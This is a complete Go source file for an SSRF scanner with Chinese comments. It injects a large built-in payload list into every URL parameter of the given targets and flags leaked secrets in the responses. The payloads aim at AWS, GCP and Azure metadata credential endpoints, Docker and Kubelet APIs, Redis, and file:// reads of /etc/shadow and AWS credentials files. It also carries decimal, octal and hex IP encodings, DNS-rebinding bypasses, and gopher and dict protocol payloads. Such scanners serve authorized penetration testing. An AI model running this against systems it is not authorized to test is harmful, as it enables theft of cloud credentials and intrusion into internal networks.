// SSRF Scanner v3.0 - 專業級 SSRF 檢測引擎
// 基於 PayloadsAllTheThings + OWASP 最佳實踐
// 採用：基線比對 + OOB 回調 + 響應差異分析
package main

import (
	"context"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	VERSION      = "3.0.0"
	SCANNER_TYPE = "ssrf"
)

// ==================== 輸入/輸出結構 ====================

type ScanRequest struct {
	ScanID      string            `json:"scan_id"`
	Targets     []string          `json:"targets"`      // 目標 URLs (需包含參數)
	Timeout     int               `json:"timeout"`      // 秒，默認 10
	Concurrency int               `json:"concurrency"`  // 並發數，默認 20
	UserAgent   string            `json:"user_agent"`
	Headers     map[string]string `json:"headers"`
	OOBServer   string            `json:"oob_server"`   // OOB 回調服務器 (如 Burp Collaborator)
	DeepScan    bool              `json:"deep_scan"`    // 是否使用所有繞過技巧
}

type ScanResult struct {
	ScanID        string    `json:"scan_id"`
	ScannerType   string    `json:"scanner_type"`
	Status        string    `json:"status"`
	ExecutionTime float64   `json:"execution_time"`
	Findings      []Finding `json:"findings"`
	Stats         Stats     `json:"stats"`
	Errors        []string  `json:"errors"`
}

type Finding struct {
	Type        string                 `json:"type"`
	Severity    string                 `json:"severity"`
	Target      string                 `json:"target"`
	Payload     string                 `json:"payload"`
	Parameter   string                 `json:"parameter"`
	Evidence    string                 `json:"evidence"`
	Confidence  string                 `json:"confidence"`
	Description string                 `json:"description"`
	Details     map[string]interface{} `json:"details"`
}

type Stats struct {
	TargetsScanned int   `json:"targets_scanned"`
	RequestsSent   int64 `json:"requests_sent"`
	FindingsCount  int   `json:"findings_count"`
	BaselineTime   int64 `json:"baseline_time_ms"`
}

// ==================== SSRF 掃描器 ====================

type SSRFScanner struct {
	client      *http.Client
	concurrency int
	oobServer   string
	deepScan    bool
	requestsSent atomic.Int64
	
	// 基線響應緩存
	baselineCache sync.Map // target -> baselineResponse
}

type baselineResponse struct {
	StatusCode  int
	BodyHash    string
	BodyLength  int
	ContentType string
	ResponseTime time.Duration
}

func NewSSRFScanner(timeout time.Duration, concurrency int, oobServer string, deepScan bool) *SSRFScanner {
	transport := &http.Transport{
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   false,
	}

	return &SSRFScanner{
		client: &http.Client{
			Timeout:   timeout,
			Transport: transport,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
		concurrency: concurrency,
		oobServer:   oobServer,
		deepScan:    deepScan,
	}
}

// getSSRFPayloads - 基於 PayloadsAllTheThings 的完整 payload 列表
func getSSRFPayloads(oobServer string, deepScan bool) []struct {
	name     string
	payload  string
	category string
	severity string
} {
	payloads := []struct {
		name     string
		payload  string
		category string
		severity string
	}{
		// ===== AWS Metadata (Critical) =====
		{"aws-metadata-v1", "http://169.254.169.254/latest/meta-data/", "cloud", "critical"},
		{"aws-metadata-iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "cloud", "critical"},
		{"aws-userdata", "http://169.254.169.254/latest/user-data/", "cloud", "critical"},
		{"aws-identity", "http://169.254.169.254/latest/dynamic/instance-identity/document", "cloud", "critical"},
		
		// ===== GCP Metadata =====
		{"gcp-metadata", "http://metadata.google.internal/computeMetadata/v1/", "cloud", "critical"},
		{"gcp-token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "cloud", "critical"},
		
		// ===== Azure Metadata =====
		{"azure-metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "cloud", "critical"},
		{"azure-identity", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "cloud", "critical"},
		
		// ===== DigitalOcean =====
		{"do-metadata", "http://169.254.169.254/metadata/v1/", "cloud", "critical"},
		
		// ===== Localhost 基本 =====
		{"localhost-basic", "http://127.0.0.1/", "internal", "high"},
		{"localhost-name", "http://localhost/", "internal", "high"},
		{"localhost-ipv6", "http://[::1]/", "internal", "high"},
		{"localhost-zero", "http://0.0.0.0/", "internal", "high"},
		
		// ===== 內部服務探測 =====
		{"internal-redis", "http://127.0.0.1:6379/", "internal", "high"},
		{"internal-mysql", "http://127.0.0.1:3306/", "internal", "high"},
		{"internal-postgres", "http://127.0.0.1:5432/", "internal", "high"},
		{"internal-mongo", "http://127.0.0.1:27017/", "internal", "high"},
		{"internal-elastic", "http://127.0.0.1:9200/", "internal", "high"},
		{"internal-docker", "http://127.0.0.1:2375/version", "internal", "critical"},
		{"internal-k8s", "http://127.0.0.1:10250/pods", "internal", "critical"},
		
		// ===== 文件讀取 =====
		{"file-passwd", "file:///etc/passwd", "file", "critical"},
		{"file-shadow", "file:///etc/shadow", "file", "critical"},
		{"file-hosts", "file:///etc/hosts", "file", "high"},
		{"file-aws-creds", "file:///home/ubuntu/.aws/credentials", "file", "critical"},
		{"file-windows-hosts", "file:///c:/windows/system32/drivers/etc/hosts", "file", "high"},
	}

	// 深度掃描：加入繞過技巧
	if deepScan {
		bypassPayloads := []struct {
			name     string
			payload  string
			category string
			severity string
		}{
			// ===== IPv6 繞過 =====
			{"bypass-ipv6-unspec", "http://[::]:80/", "bypass", "high"},
			{"bypass-ipv6-full", "http://[0000::1]:80/", "bypass", "high"},
			{"bypass-ipv6-mapped", "http://[::ffff:127.0.0.1]/", "bypass", "high"},
			
			// ===== CIDR 繞過 =====
			{"bypass-cidr-1", "http://127.127.127.127/", "bypass", "high"},
			{"bypass-cidr-2", "http://127.0.1.3/", "bypass", "high"},
			
			// ===== 短格式 =====
			{"bypass-short-1", "http://0/", "bypass", "high"},
			{"bypass-short-2", "http://127.1/", "bypass", "high"},
			
			// ===== 編碼繞過 - 十進制 =====
			{"bypass-decimal-127", "http://2130706433/", "bypass", "high"},           // 127.0.0.1
			{"bypass-decimal-meta", "http://2852039166/", "bypass", "critical"},       // 169.254.169.254
			
			// ===== 編碼繞過 - 八進制 =====
			{"bypass-octal-1", "http://0177.0.0.1/", "bypass", "high"},
			{"bypass-octal-2", "http://0177.0.0.01/", "bypass", "high"},
			
			// ===== 編碼繞過 - 十六進制 =====
			{"bypass-hex-1", "http://0x7f000001/", "bypass", "high"},
			{"bypass-hex-2", "http://0x7f.0x0.0x0.0x1/", "bypass", "high"},
			{"bypass-hex-meta", "http://0xa9fea9fe/", "bypass", "critical"},           // 169.254.169.254
			
			// ===== DNS Rebinding =====
			{"bypass-dns-nip", "http://127.0.0.1.nip.io/", "bypass", "high"},
			{"bypass-dns-localtest", "http://localtest.me/", "bypass", "high"},
			{"bypass-dns-spoofed", "http://spoofed.burpcollaborator.net/", "bypass", "high"},
			{"bypass-dns-localh", "http://localh.st/", "bypass", "high"},
			
			// ===== URL 解析差異 =====
			{"bypass-parse-1", "http://127.0.0.1:80\\@google.com/", "bypass", "high"},
			{"bypass-parse-2", "http://127.0.0.1:80#@google.com/", "bypass", "high"},
			{"bypass-parse-3", "http://google.com@127.0.0.1/", "bypass", "high"},
			
			// ===== URL 編碼 =====
			{"bypass-encode-1", "http://127.0.0.1/%61dmin", "bypass", "high"},
			{"bypass-encode-2", "http://127.0.0.1/%2561dmin", "bypass", "high"},
			
			// ===== 協議探測 =====
			{"proto-dict", "dict://127.0.0.1:6379/info", "protocol", "high"},
			{"proto-gopher", "gopher://127.0.0.1:6379/_INFO%0d%0a", "protocol", "high"},
			{"proto-tftp", "tftp://127.0.0.1:69/test", "protocol", "medium"},
			{"proto-ldap", "ldap://127.0.0.1:389/", "protocol", "high"},
		}
		payloads = append(payloads, bypassPayloads...)
	}

	// 加入 OOB Server payloads
	if oobServer != "" {
		oobPayloads := []struct {
			name     string
			payload  string
			category string
			severity string
		}{
			{"oob-http", fmt.Sprintf("http://%s/ssrf-test", oobServer), "oob", "high"},
			{"oob-https", fmt.Sprintf("https://%s/ssrf-test", oobServer), "oob", "high"},
			{"oob-dns", fmt.Sprintf("http://ssrf.%s/", oobServer), "oob", "high"},
		}
		payloads = append(payloads, oobPayloads...)
	}

	return payloads
}

// Scan - 執行 SSRF 掃描
func (s *SSRFScanner) Scan(ctx context.Context, req *ScanRequest) *ScanResult {
	result := &ScanResult{
		ScanID:      req.ScanID,
		ScannerType: SCANNER_TYPE,
		Status:      "success",
		Findings:    []Finding{},
		Errors:      []string{},
	}

	payloads := getSSRFPayloads(s.oobServer, s.deepScan)

	// 建立任務 channel
	type scanTask struct {
		target  string
		param   string
		payload struct {
			name     string
			payload  string
			category string
			severity string
		}
	}

	taskCh := make(chan scanTask, s.concurrency*2)
	findingCh := make(chan *Finding, s.concurrency)

	// 啟動 workers
	var wg sync.WaitGroup
	for i := 0; i < s.concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for task := range taskCh {
				select {
				case <-ctx.Done():
					return
				default:
				}
				finding := s.testPayload(ctx, task.target, task.param, task.payload, req)
				if finding != nil {
					findingCh <- finding
				}
			}
		}()
	}

	// 收集結果
	var findings []Finding
	var mu sync.Mutex
	done := make(chan struct{})
	go func() {
		for finding := range findingCh {
			mu.Lock()
			findings = append(findings, *finding)
			mu.Unlock()
		}
		close(done)
	}()

	// 生成任務
	go func() {
		for _, target := range req.Targets {
			// Step 1: 獲取基線響應
			baseline := s.getBaseline(ctx, target, req)
			s.baselineCache.Store(target, baseline)

			// Step 2: 提取參數
			params := extractParams(target)

			// Step 3: 對每個參數測試所有 payloads
			for paramName := range params {
				for _, payload := range payloads {
					select {
					case <-ctx.Done():
						close(taskCh)
						return
					case taskCh <- scanTask{target: target, param: paramName, payload: payload}:
					}
				}
			}
		}
		close(taskCh)
	}()

	wg.Wait()
	close(findingCh)
	<-done

	result.Findings = findings
	result.Stats = Stats{
		TargetsScanned: len(req.Targets),
		RequestsSent:   s.requestsSent.Load(),
		FindingsCount:  len(findings),
	}

	if len(result.Findings) == 0 && len(result.Errors) == 0 {
		result.Status = "clean"
	} else if len(result.Errors) > 0 && len(result.Findings) == 0 {
		result.Status = "failed"
	}

	return result
}

// getBaseline - 獲取正常響應基線
func (s *SSRFScanner) getBaseline(ctx context.Context, target string, req *ScanRequest) *baselineResponse {
	httpReq, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return nil
	}

	setHeaders(httpReq, req)
	s.requestsSent.Add(1)

	start := time.Now()
	resp, err := s.client.Do(httpReq)
	elapsed := time.Since(start)

	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
	hash := md5.Sum(body)

	return &baselineResponse{
		StatusCode:   resp.StatusCode,
		BodyHash:     hex.EncodeToString(hash[:]),
		BodyLength:   len(body),
		ContentType:  resp.Header.Get("Content-Type"),
		ResponseTime: elapsed,
	}
}

// testPayload - 測試單個 payload
func (s *SSRFScanner) testPayload(ctx context.Context, target, param string, payload struct {
	name     string
	payload  string
	category string
	severity string
}, req *ScanRequest) *Finding {

	// 構建測試 URL
	parsedURL, err := url.Parse(target)
	if err != nil {
		return nil
	}

	query := parsedURL.Query()
	query.Set(param, payload.payload)
	parsedURL.RawQuery = query.Encode()
	testURL := parsedURL.String()

	// 發送請求
	httpReq, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return nil
	}

	setHeaders(httpReq, req)
	s.requestsSent.Add(1)

	start := time.Now()
	resp, err := s.client.Do(httpReq)
	elapsed := time.Since(start)

	if err != nil {
		// 某些協議 (file://, gopher://) 會導致錯誤，但錯誤信息可能洩露信息
		if strings.Contains(err.Error(), "unsupported protocol") {
			return nil
		}
		// 連接被拒絕可能表示端口存在
		if strings.Contains(err.Error(), "connection refused") {
			return &Finding{
				Type:        "ssrf_port_scan",
				Severity:    "medium",
				Target:      target,
				Payload:     payload.payload,
				Parameter:   param,
				Evidence:    fmt.Sprintf("Connection refused - port exists: %v", err),
				Confidence:  "medium",
				Description: "Server attempted to connect to internal port (connection refused)",
				Details: map[string]interface{}{
					"payload_name": payload.name,
					"category":     payload.category,
				},
			}
		}
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 10240))
	bodyStr := string(body)

	// 獲取基線進行比對
	baselineI, exists := s.baselineCache.Load(target)
	var baseline *baselineResponse
	if exists {
		baseline = baselineI.(*baselineResponse)
	}

	// 分析響應
	return s.analyzeResponse(target, param, payload, resp.StatusCode, bodyStr, elapsed, baseline)
}

// analyzeResponse - 智能響應分析
func (s *SSRFScanner) analyzeResponse(target, param string, payload struct {
	name     string
	payload  string
	category string
	severity string
}, statusCode int, body string, responseTime time.Duration, baseline *baselineResponse) *Finding {

	bodyLower := strings.ToLower(body)

	// ===== 1. 明確的漏洞指標 (Critical) =====
	criticalIndicators := map[string]string{
		// AWS
		"ami-":                    "AWS EC2 AMI ID leaked",
		"accesskeyid":            "AWS Access Key leaked",
		"secretaccesskey":        "AWS Secret Key leaked",
		"iam/security-credentials": "AWS IAM credentials endpoint accessed",
		"instance-id\":\"i-":     "AWS instance ID leaked",
		
		// GCP
		"\"project_id\":":        "GCP project metadata leaked",
		"accounts.google.com":    "GCP service account token leaked",
		
		// Azure
		"\"subscriptionid\":":    "Azure subscription ID leaked",
		
		// 文件內容
		"root:x:0:0:":            "Linux /etc/passwd file read",
		"root:$":                 "Linux /etc/shadow file read (critical!)",
		"aws_access_key_id":      "AWS credentials file read",
		"aws_secret_access_key":  "AWS credentials file read",
		
		// 內部服務
		"redis_version:":         "Redis server information leaked",
		"\"cluster_name\":":      "Elasticsearch cluster information leaked",
		"server\":\"docker":      "Docker API accessed",
	}

	for pattern, description := range criticalIndicators {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			return &Finding{
				Type:        "ssrf_confirmed",
				Severity:    "critical",
				Target:      target,
				Payload:     payload.payload,
				Parameter:   param,
				Evidence:    truncateString(body, 1000),
				Confidence:  "high",
				Description: description,
				Details: map[string]interface{}{
					"payload_name": payload.name,
					"category":     payload.category,
					"indicator":    pattern,
					"status_code":  statusCode,
				},
			}
		}
	}

	// ===== 2. 響應差異分析 =====
	if baseline != nil {
		currentHash := md5.Sum([]byte(body))
		currentHashStr := hex.EncodeToString(currentHash[:])

		// 響應內容完全不同
		if currentHashStr != baseline.BodyHash {
			// 檢查是否有敏感內容
			if containsSensitiveContent(body) {
				return &Finding{
					Type:        "ssrf_potential",
					Severity:    payload.severity,
					Target:      target,
					Payload:     payload.payload,
					Parameter:   param,
					Evidence:    truncateString(body, 500),
					Confidence:  "medium",
					Description: "Response differs from baseline and contains sensitive content",
					Details: map[string]interface{}{
						"payload_name":      payload.name,
						"category":          payload.category,
						"baseline_hash":     baseline.BodyHash,
						"response_hash":     currentHashStr,
						"baseline_length":   baseline.BodyLength,
						"response_length":   len(body),
						"baseline_status":   baseline.StatusCode,
						"response_status":   statusCode,
					},
				}
			}
		}

		// 狀態碼變化 (可能表示內部錯誤)
		if statusCode != baseline.StatusCode {
			// 從 200 變成 500 可能表示 SSRF 觸發了內部錯誤
			if baseline.StatusCode == 200 && statusCode >= 500 {
				return &Finding{
					Type:        "ssrf_error_based",
					Severity:    "medium",
					Target:      target,
					Payload:     payload.payload,
					Parameter:   param,
					Evidence:    truncateString(body, 300),
					Confidence:  "low",
					Description: "Server returned error when processing SSRF payload",
					Details: map[string]interface{}{
						"payload_name":    payload.name,
						"baseline_status": baseline.StatusCode,
						"response_status": statusCode,
					},
				}
			}
		}

		// 響應時間異常 (可能表示內部連接嘗試)
		if baseline.ResponseTime > 0 && responseTime > baseline.ResponseTime*3 {
			return &Finding{
				Type:        "ssrf_timing_based",
				Severity:    "low",
				Target:      target,
				Payload:     payload.payload,
				Parameter:   param,
				Evidence:    fmt.Sprintf("Response time: %v (baseline: %v)", responseTime, baseline.ResponseTime),
				Confidence:  "low",
				Description: "Significant response time increase may indicate internal connection attempt",
				Details: map[string]interface{}{
					"payload_name":    payload.name,
					"baseline_time":   baseline.ResponseTime.Milliseconds(),
					"response_time":   responseTime.Milliseconds(),
				},
			}
		}
	}

	return nil
}

// containsSensitiveContent - 檢查是否包含敏感內容
func containsSensitiveContent(body string) bool {
	sensitivePatterns := []string{
		"password", "secret", "token", "api_key", "apikey",
		"private", "credential", "auth", "session",
		"internal", "admin", "root", "config",
		"database", "mysql", "postgres", "redis",
		"ssh", "key", "cert", "pem",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range sensitivePatterns {
		if strings.Contains(bodyLower, pattern) {
			return true
		}
	}
	return false
}

// extractParams - 提取 URL 參數
func extractParams(target string) map[string]bool {
	params := make(map[string]bool)

	parsedURL, err := url.Parse(target)
	if err != nil {
		return params
	}

	for key := range parsedURL.Query() {
		params[key] = true
	}

	// 如果沒有參數，使用 SSRF 常見參數
	if len(params) == 0 {
		commonParams := []string{
			"url", "uri", "path", "dest", "redirect", "next",
			"data", "reference", "site", "html", "val", "domain",
			"callback", "return", "page", "feed", "host", "port",
			"to", "out", "view", "dir", "show", "navigation",
			"open", "file", "document", "folder", "pg", "style",
			"doc", "img", "source", "src", "link", "href",
			"target", "proxy", "fetch", "request", "load",
		}
		for _, p := range commonParams {
			params[p] = true
		}
	}

	return params
}

func setHeaders(req *http.Request, scanReq *ScanRequest) {
	if scanReq.UserAgent != "" {
		req.Header.Set("User-Agent", scanReq.UserAgent)
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	}
	for k, v := range scanReq.Headers {
		req.Header.Set(k, v)
	}
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "...[truncated]"
}

// ==================== 主程序 ====================

func main() {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		log.Println("[INFO] Shutdown signal received")
		cancel()
	}()

	var req ScanRequest
	if err := json.NewDecoder(os.Stdin).Decode(&req); err != nil {
		outputError("Failed to decode input", err)
		os.Exit(1)
	}

	if len(req.Targets) == 0 {
		outputError("No targets provided", fmt.Errorf("targets list is empty"))
		os.Exit(1)
	}

	timeout := 10 * time.Second
	if req.Timeout > 0 {
		timeout = time.Duration(req.Timeout) * time.Second
	}

	concurrency := 20
	if req.Concurrency > 0 {
		concurrency = req.Concurrency
	}

	log.Printf("[INFO] SSRF Scanner v%s - targets=%d concurrency=%d deep_scan=%v oob=%s\n",
		VERSION, len(req.Targets), concurrency, req.DeepScan, req.OOBServer)

	scanner := NewSSRFScanner(timeout, concurrency, req.OOBServer, req.DeepScan)
	startTime := time.Now()

	result := scanner.Scan(ctx, &req)
	result.ExecutionTime = time.Since(startTime).Seconds()

	outputResult(result)

	log.Printf("[INFO] Completed - status=%s findings=%d requests=%d time=%.2fs\n",
		result.Status, len(result.Findings), result.Stats.RequestsSent, result.ExecutionTime)
}

func outputResult(result *ScanResult) {
	encoder := json.NewEncoder(os.Stdout)
	encoder.SetIndent("", "  ")
	encoder.Encode(result)
}

func outputError(message string, err error) {
	log.Printf("[ERROR] %s: %v\n", message, err)
	result := &ScanResult{
		ScannerType: SCANNER_TYPE,
		Status:      "failed",
		Errors:      []string{fmt.Sprintf("%s: %v", message, err)},
	}
	outputResult(result)
}
